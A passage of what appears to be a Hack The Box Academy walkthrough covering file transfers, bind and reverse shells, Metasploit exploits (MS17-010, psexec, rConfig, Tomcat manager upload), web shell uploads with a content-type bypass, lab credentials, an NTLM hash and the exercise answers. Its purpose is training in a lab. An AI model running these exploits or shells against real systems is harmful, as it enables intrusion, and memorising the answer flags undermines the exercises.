</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6"></a>
</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7"></a># In the windows machine, open Powershell and retrieve the file:
</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8"></a>(New-Object Net.WebClient).DownloadFile(&#39;http://$ip/upload_win.zip&#39;,&#39;C:\Users\htb-student\Desktop\upload_win.zip&#39;)
</span><span id="__span-118-9"><a id="__codelineno-118-9" name="__codelineno-118-9"></a>
</span><span id="__span-118-10"><a id="__codelineno-118-10" name="__codelineno-118-10"></a># Unzip it in the Desktop. Open cmd and run:
</span><span id="__span-118-11"><a id="__codelineno-118-11" name="__codelineno-118-11"></a>hasher C:\Users\htb-student\Desktop\upload_win\upload_win.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  f458303ea783c224c6b4e7ef7f17eb9d</p>
<h3 id="linux-file-transfer-methods">Linux File Transfer methods</h3>
<p><strong>Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-119-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1"></a>wget -O flag.txt http://$ip/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  5d21cf3da9c0ccb94f709e2559f3ea50</p>
<p><strong>SSH to 10.129.206.169 (ACADEMY-MISC-NIX04) with user "htb-student" and password "HTB_@cademy_stdnt!". Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher <code>&lt;extracted file&gt;</code>" from the command line. Submit the generated hash as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-120-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-120-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-120-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-120-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-120-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-120-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-120-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-120-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-120-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-120-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1"></a>scp upload_nix.zip htb-student@$ip:/tmp
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2"></a># Enter the htb-student password
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3"></a>
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4"></a># Unzip file
</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5"></a>python3 -m zipfile -e  upload_nix.zip .
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6"></a># Or
</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7"></a> gunzip -S .zip upload_nix.zip
</span><span id="__span-120-8"><a id="__codelineno-120-8" name="__codelineno-120-8"></a>
</span><span id="__span-120-9"><a id="__codelineno-120-9" name="__codelineno-120-9"></a># hash it
</span><span id="__span-120-10"><a id="__codelineno-120-10" name="__codelineno-120-10"></a>hasher upload_nix.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  159cfe5c65054bbadb2761cfa359c8b0</p>
<h2 id="shells-payloads"><a href="https://academy.hackthebox.com/module/details/115">Shells &amp; Payloads</a></h2>
<h3 id="shell-basics">Shell Basics</h3>
<p><strong>Which two shell languages did we experiment with in this section? (Format: shellname&amp;shellname)</strong></p>
<p>Results:  bash&amp;powershell</p>
<p><strong>In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.</strong>
Results:  Core</p>
<p><strong>Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?</strong></p>
<p>Results:  443</p>
<p><strong>SSH to $ipVictim with user "htb-student" and password "HTB_@cademy_stdnt!". Create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-121-1">1</a></span>
<span class="normal"><a href="#__codelineno-121-2">2</a></span>
<span class="normal"><a href="#__codelineno-121-3">3</a></span>
<span class="normal"><a href="#__codelineno-121-4">4</a></span>
<span class="normal"><a href="#__codelineno-121-5">5</a></span>
<span class="normal"><a href="#__codelineno-121-6">6</a></span>
<span class="normal"><a href="#__codelineno-121-7">7</a></span>
<span class="normal"><a href="#__codelineno-121-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1"></a># Connect via ssh with victim&#39;s machine. In the attacker machine:
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2"></a>ssh htb-student@$ipVictim
</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3"></a># enter password. Now, in the same terminal set the listener:
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4"></a>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l $ipVictim $port &gt; /tmp/f
</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5"></a>
</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6"></a># In the attacker terminal:
</span><span id="__span-121-7"><a id="__codelineno-121-7" name="__codelineno-121-7"></a>nc $ipVictim $port
</span><span id="__span-121-8"><a id="__codelineno-121-8" name="__codelineno-121-8"></a>cat /customscripts/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  B1nD_Shells_r_cool</p>
<p><strong>When establishing a reverse shell session with a target, will the target act as a client or server?</strong>
Results:  Client</p>
<p><strong>Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.</strong></p>
<p>Results:  Shells-Win10</p>
<h3 id="payloads">Payloads</h3>
<p><strong>What command language interpreter is used to establish a system shell session with the target?</strong></p>
<p>Results:  powershell</p>
<p><strong>Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-122-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-122-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-122-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-122-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-122-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-122-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-122-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-122-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-122-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-122-10">10</a></span>
<span class="normal"><a href="#__codelineno-122-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1"></a>msfconsole -q
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2"></a>use exploit/windows/smb/psexec
</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3"></a>show info
</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4"></a>set RHOSTS ...
</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5"></a>set LHOST ...
</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6"></a>set SMBPass HTB_@cademy_stdnt!  
</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7"></a>set SMBUser htb-student
</span><span id="__span-122-8"><a id="__codelineno-122-8" name="__codelineno-122-8"></a>set SMBSHARE ADMIN$
</span><span id="__span-122-9"><a id="__codelineno-122-9" name="__codelineno-122-9"></a>run
</span><span id="__span-122-10"><a id="__codelineno-122-10" name="__codelineno-122-10"></a>
</span><span id="__span-122-11"><a id="__codelineno-122-11" name="__codelineno-122-11"></a>dir C:\Users\htb-student\Documents&gt;
</span></code></pre></div></td></tr></table></div>
<p>Results:  staffsalaries.txt</p>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::</p>
<h3 id="windows-shells">Windows Shells</h3>
<p><strong>What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')</strong></p>
<p>Results:  .bat</p>
<p><strong>What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)</strong></p>
<p>Results:  MS17-010</p>
<p>*<em>Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:*</em></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-123-1">1</a></span>
<span class="normal"><a href="#__codelineno-123-2">2</a></span>
<span class="normal"><a href="#__codelineno-123-3">3</a></span>
<span class="normal"><a href="#__codelineno-123-4">4</a></span>
<span class="normal"><a href="#__codelineno-123-5">5</a></span>
<span class="normal"><a href="#__codelineno-123-6">6</a></span>
<span class="normal"><a href="#__codelineno-123-7">7</a></span>
<span class="normal"><a href="#__codelineno-123-8">8</a></span>
<span class="normal"><a href="#__codelineno-123-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1"></a>sudo nmap -sC -sV -O $ip -Pn
</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2"></a>msfconsole -q
</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3"></a>
</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4"></a>search MS17-010
</span><span id="__span-123-5"><a id="__codelineno-123-5" name="__codelineno-123-5"></a>use windows/smb/ms17_010_psexec
</span><span id="__span-123-6"><a id="__codelineno-123-6" name="__codelineno-123-6"></a>set RHOSTS...
</span><span id="__span-123-7"><a id="__codelineno-123-7" name="__codelineno-123-7"></a>set SHARE ADMIN$
</span><span id="__span-123-8"><a id="__codelineno-123-8" name="__codelineno-123-8"></a>set LHOST
</span><span id="__span-123-9"><a id="__codelineno-123-9" name="__codelineno-123-9"></a>run
</span></code></pre></div></td></tr></table></div>
<p>Results:  EB-Still-W0rk$</p>
<h3 id="nix-shells">NIX Shells</h3>
<p><strong>What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?</strong></p>
<p>Results:  php</p>
<p>Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-124-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-124-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-124-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-124-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-124-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-124-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-124-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-124-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-124-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-124-10">10</a></span>
<span class="normal"><a href="#__codelineno-124-11">11</a></span>
<span class="normal"><a href="#__codelineno-124-12">12</a></span>
<span class="normal"><a href="#__codelineno-124-13">13</a></span>
<span class="normal"><a href="#__codelineno-124-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1"></a>sudo nmap -sC -sV -v $ip -Pn
</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2"></a>
</span><span id="__span-124-3"><a id="__codelineno-124-3" name="__codelineno-124-3"></a># Enter ip in the browser and discover rConfig Version 3.9.6 
</span><span id="__span-124-4"><a id="__codelineno-124-4" name="__codelineno-124-4"></a>
</span><span id="__span-124-5"><a id="__codelineno-124-5" name="__codelineno-124-5"></a>msfconsole -q
</span><span id="__span-124-6"><a id="__codelineno-124-6" name="__codelineno-124-6"></a>search rConfig
</span><span id="__span-124-7"><a id="__codelineno-124-7" name="__codelineno-124-7"></a>use linux/http/rconfig_vendors_auth_file_upload_rce
</span><span id="__span-124-8"><a id="__codelineno-124-8" name="__codelineno-124-8"></a>set RHOSTS
</span><span id="__span-124-9"><a id="__codelineno-124-9" name="__codelineno-124-9"></a>set LHOST
</span><span id="__span-124-10"><a id="__codelineno-124-10" name="__codelineno-124-10"></a>run
</span><span id="__span-124-11"><a id="__codelineno-124-11" name="__codelineno-124-11"></a>
</span><span id="__span-124-12"><a id="__codelineno-124-12" name="__codelineno-124-12"></a>ls -la /devicedetails
</span><span id="__span-124-13"><a id="__codelineno-124-13" name="__codelineno-124-13"></a>cat /devicedetails/hostnameinfo.txt
</span><span id="__span-124-14"><a id="__codelineno-124-14" name="__codelineno-124-14"></a>cat /devicedetails/edgerouter-isp.yml
</span></code></pre></div></td></tr></table></div>
<p>Results:  edgerouter-isp</p>
<h3 id="web-shells">Web Shells</h3>
<h4 id="laudanum">laudanum</h4>
<p>vHosts needed for these questions: <code>status.inlanefreight.local</code>
Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-125-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-125-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-125-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-125-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-125-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-125-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-125-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-125-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-125-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-125-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1"></a><span class="go">sudo nmap -sC -sV $ip</span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2"></a>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3"></a><span class="gp"># </span>Add<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ip</span><span class="s2"> status.inlanefreight.local&quot;</span><span class="w"> </span>to<span class="w"> </span>/etc/hosts
</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4"></a><span class="gp"># </span>browse<span class="w"> </span>to<span class="w"> </span>status.inlanefreight.local
</span><span id="__span-125-5"><a id="__codelineno-125-5" name="__codelineno-125-5"></a><span class="gp"># </span>Infer<span class="w"> </span>that<span class="w"> </span>aspx<span class="w"> </span>is<span class="w"> </span><span class="k">in</span><span class="w"> </span>use.
</span><span id="__span-125-6"><a id="__codelineno-125-6" name="__codelineno-125-6"></a><span class="gp"># </span>Notice<span class="w"> </span>the<span class="w"> </span>upload<span class="w"> </span>file<span class="w"> </span>feature<span class="w"> </span>by<span class="w"> </span>the<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>page
</span><span id="__span-125-7"><a id="__codelineno-125-7" name="__codelineno-125-7"></a>
</span><span id="__span-125-8"><a id="__codelineno-125-8" name="__codelineno-125-8"></a><span class="gp"># </span>Copy<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>from<span class="w"> </span>laudanum<span class="w"> </span>repo<span class="w"> </span>to<span class="w"> </span>where<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>it<span class="w"> </span>from:
</span><span id="__span-125-9"><a id="__codelineno-125-9" name="__codelineno-125-9"></a><span class="go">cp /usr/share/laudanum/aspx/shell.aspx /your/path/laudanum.aspx</span>
</span><span id="__span-125-10"><a id="__codelineno-125-10" name="__codelineno-125-10"></a><span class="gp"># </span>In<span class="w"> </span>this<span class="w"> </span><span class="k">case</span><span class="w"> </span>I<span class="err">&#39;</span>m<span class="w"> </span>selecting<span class="w"> </span>an<span class="w"> </span>aspx<span class="w"> </span>shell.<span class="w"> </span>There<span class="w"> </span>are<span class="w"> </span>other<span class="w"> </span>types.
</span></code></pre></div></td></tr></table></div>
<p>Modify the shell to use. Add to the whitelisting rule your ip.</p>
<p><img alt="laudanum" src="../img/laudanum2.png" /></p>
<p>Upload the file to the web server.</p>
<p>Once uploaded, go to http://status.inlanefreight.local//file/laudanum.aspx which is your uploaded file. You will see something like:</p>
<p><img alt="laudanum" src="../img/laudanum.png" /></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-126-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1"></a>dir
</span></code></pre></div></td></tr></table></div>
<p>Results:  c:\windows\system32\inetsrv</p>
<p>Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-127-1">1</a></span>
<span class="normal"><a href="#__codelineno-127-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1"></a># Spawn Pwnbox and open a Parrot terminal
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2"></a>locate laudanum
</span></code></pre></div></td></tr></table></div>
<p>Results:  /usr/share/laudanum/aspx/shell.aspx</p>
<h4 id="antak-webshell">antak webshell</h4>
<p><strong>vHosts needed for these questions: <code>status.inlanefreight.local</code>. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-128-1">1</a></span>
<span class="normal"><a href="#__codelineno-128-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1"></a># Spawn Pwnbox and open a Parrot terminal
</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2"></a>locate antak
</span></code></pre></div></td></tr></table></div>
<p>Results:  /usr/share/nishang/Antak-WebShell/antak.aspx</p>
<p><strong>Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: </strong>*<em>, 1 space)</em>*</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-129-1">1</a></span>
<span class="normal"><a href="#__codelineno-129-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1"></a><span class="gp"># </span>First<span class="w"> </span>step,<span class="w"> </span>generate<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>you<span class="w"> </span>will<span class="w"> </span>upload:
</span><span id="__span-129-2"><a id="__codelineno-129-2" name="__codelineno-129-2"></a><span class="go">sudo cp /usr/share/nishang/Antak-WebShell/antak.aspx /path/Upload.aspx</span>
</span></code></pre></div></td></tr></table></div>
<p>Set credentials for access to the web shell. Modify <code>line 14</code>, adding a user and password.</p>
<p><img alt="antak" src="../img/antak.png" /></p>
<p>Open the browser and upload the file to the web app.  Open the url  //files/Upload.aspx and enter user and password.</p>
<p><img alt="antak2" src="../img/antak2.png" /></p>
<p>Now that we have access, we can utilize PowerShell commands to navigate and take actions against the host.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-130-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1"></a>whoami
</span></code></pre></div></td></tr></table></div>
<p>Results:  iis apppool\status</p>
<h4 id="php-shells">php shells</h4>
<p><strong>In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../...)</strong></p>
<p>Results:  image/gif</p>
<p><strong>Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-131-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-131-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-131-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-131-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-131-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-131-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-131-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-131-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-131-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-131-10">10</a></span>
<span class="normal"><a href="#__codelineno-131-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1"></a># Access the site and enter credentials admin:admin
</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2"></a># Go to devices &gt; vendor 
</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3"></a># Intercept the uploading of the logo
</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4"></a># Use https://www.revshells.com/ -&gt; PHP Ivan Sincek
</span><span id="__span-131-5"><a id="__codelineno-131-5" name="__codelineno-131-5"></a># Modifify the file to contain attacker ip and port
</span><span id="__span-131-6"><a id="__codelineno-131-6" name="__codelineno-131-6"></a># Upload it. Bypass content-type. Leave image/gif. Leave in the intercepted payload the PHP extensionin filename.
</span><span id="__span-131-7"><a id="__codelineno-131-7" name="__codelineno-131-7"></a># Set a netcat listener
</span><span id="__span-131-8"><a id="__codelineno-131-8" name="__codelineno-131-8"></a>nc -lnvp 1234
</span><span id="__span-131-9"><a id="__codelineno-131-9" name="__codelineno-131-9"></a># Trigger the uploaded file from https://$ip/images/vendor/nameOfUploadedFile.php
</span><span id="__span-131-10"><a id="__codelineno-131-10" name="__codelineno-131-10"></a># You will get the reverse shell. List files
</span><span id="__span-131-11"><a id="__codelineno-131-11" name="__codelineno-131-11"></a>ls -la
</span></code></pre></div></td></tr></table></div>
<p>Results:  ajax-loader.gif</p>
<h3 id="skills-assessment_2">Skills Assessment</h3>
<p>CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your <code>Pwnbox</code>, we will need to <code>RDP</code> into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.</p>
<p>Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (<code>172.16.1.0/23</code> network) so you may want to pay careful attention to the IP address you pick when starting your listeners.</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-132-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1"></a>xfreerdp<span class="w"> </span>/v:&lt;target<span class="w"> </span>IP&gt;<span class="w"> </span>/u:htb-student<span class="w"> </span>/p:HTB_@cademy_stdnt!
</span></code></pre></div></td></tr></table></div>
<p>10.129.213.83</p>
<p><strong>What is the hostname of Host-1? (Format: all lower case)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-133-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-133-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-133-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-133-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-133-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-133-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-133-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-133-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-133-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-133-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1"></a># Connect to the parrot machine
</span><span id="__span-133-2"><a id="__codelineno-133-2" name="__codelineno-133-2"></a>xfreerdp /v:&lt;target IP&gt; /u:htb-student /p:HTB_@cademy_stdnt!
</span><span id="__span-133-3"><a id="__codelineno-133-3" name="__codelineno-133-3"></a>
</span><span id="__span-133-4"><a id="__codelineno-133-4" name="__codelineno-133-4"></a># Open a terminal and scan ip range 172.16.1.0/23
</span><span id="__span-133-5"><a id="__codelineno-133-5" name="__codelineno-133-5"></a>nmap 172.16.1.0/23
</span><span id="__span-133-6"><a id="__codelineno-133-6" name="__codelineno-133-6"></a>
</span><span id="__span-133-7"><a id="__codelineno-133-7" name="__codelineno-133-7"></a># Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:
</span><span id="__span-133-8"><a id="__codelineno-133-8" name="__codelineno-133-8"></a>sudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080
</span><span id="__span-133-9"><a id="__codelineno-133-9" name="__codelineno-133-9"></a>
</span><span id="__span-133-10"><a id="__codelineno-133-10" name="__codelineno-133-10"></a># The hostname is displayed
</span></code></pre></div></td></tr></table></div>
<p>Results:  SHELLS-WINSVR</p>
<p><strong>Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-134-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-134-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-134-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-134-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-134-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-134-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-134-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-134-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-134-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-134-10">10</a></span>
<span class="normal"><a href="#__codelineno-134-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1"></a># The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.
</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2"></a># One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:
</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3"></a>msfconsole -q
</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4"></a>search tomcat
</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5"></a>use multi/http/tomcat_mgr_upload
</span><span id="__span-134-6"><a id="__codelineno-134-6" name="__codelineno-134-6"></a>set RHOSTS 172.16.1.11
</span><span id="__span-134-7"><a id="__codelineno-134-7" name="__codelineno-134-7"></a>set RPORT 8080
</span><span id="__span-134-8"><a id="__codelineno-134-8" name="__codelineno-134-8"></a>set target Windows Universal
</span><span id="__span-134-9"><a id="__codelineno-134-9" name="__codelineno-134-9"></a>set payload payload/generic/shell_reverse_tcp 
</span><span id="__span-134-10"><a id="__codelineno-134-10" name="__codelineno-134-10"></a># After gaining access, go to c:\Shares
</span><span id="__span-134-11"><a id="__codelineno-134-11" name="__codelineno-134-11"></a>dir
</span></code></pre></div></td></tr></table></div>
<p>Results:   dev-share</p>
<p><strong>What distribution of Linux is running on Host-2? (Format: distro name, all lower case)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-135-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1"></a>nmap -A 172.16.1.12 -p22,80
</span></code></pre></div></td></tr></table></div>
<p>Results:  Ubuntu</p>
